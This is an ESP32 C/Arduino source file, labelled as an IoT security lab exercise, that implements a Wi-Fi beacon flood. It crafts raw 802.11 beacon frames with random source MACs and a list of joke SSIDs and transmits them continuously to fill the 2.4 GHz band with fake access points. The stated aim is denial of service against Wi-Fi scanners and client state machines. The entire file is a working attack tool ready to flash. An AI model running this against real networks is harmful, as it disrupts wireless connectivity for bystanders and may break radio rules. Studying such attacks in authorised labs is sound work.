/*
 * ESP32 Beacon Flood
 * Category: WiFi Attacks
 *
 * Injects 802.11 beacon frames with randomized source MACs to
 * fill the 2.4 GHz band with ghost APs. Demonstrates DoS
 * against WiFi scanners and supplicant state machines.
 *
 * Board  : ESP32 DevKit V1
 * Library: esp_wifi.h, nvs_flash.h (ESP-IDF bundled)
 * KLS GIT Belagavi — IoT Security Lab | Authorized use only.
 */
#include <esp_wifi.h>
#include <nvs_flash.h>
#include <string.h>

const char* SSIDS[] = {
  "FBI_Surveillance_Van_3",   "Pretty_Fly_for_a_WiFi",
  "Everyday_Im_Buffering",    "Abraham_Linksys",
  "Drop_It_Like_Its_Hotspot", "Silence_of_the_LANs",
  "The_Promised_LAN",         "I_Believe_Wi_Can_Fi",
  "Loading___Please_Wait",    "Not_Your_Grandmas_WiFi"
};
const int N = 10;

const uint8_t BCN_HEAD[] = {
  0x80,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x64,0x00, 0x31,0x04, 0x00
};
uint8_t buf[200];

void sendBeacon(const char* ssid) {
  uint8_t mac[6]={0x02,(uint8_t)random(256),(uint8_t)random(256),
                       (uint8_t)random(256),(uint8_t)random(256),(uint8_t)random(256)};
  int slen = strlen(ssid);
  memcpy(buf,BCN_HEAD,sizeof(BCN_HEAD));
  memcpy(buf+10,mac,6); memcpy(buf+16,mac,6);
  buf[sizeof(BCN_HEAD)] = slen;
  memcpy(buf+sizeof(BCN_HEAD)+1,ssid,slen);
  int pos = sizeof(BCN_HEAD)+1+slen;
  uint8_t rates[]={0x01,0x08,0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
  memcpy(buf+pos,rates,10); pos+=10;
  buf[pos++]=0x03; buf[pos++]=0x01; buf[pos++]=6;
  esp_wifi_80211_tx(WIFI_IF_AP,buf,pos,false);
}

void setup() {
  Serial.begin(115200);
  nvs_flash_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_mode(WIFI_MODE_AP);
  wifi_config_t ap={};
  strcpy((char*)ap.ap.ssid,"ESP32"); ap.ap.channel=6;
  esp_wifi_set_config(WIFI_IF_AP,&ap);
  esp_wifi_start();
  Serial.printf("[*] Beacon Flood — %d fake SSIDs\n",N);
}

void loop() {
  for(int i=0;i<N;i++){sendBeacon(SSIDS[i]);delay(5);}
  delay(200);
}
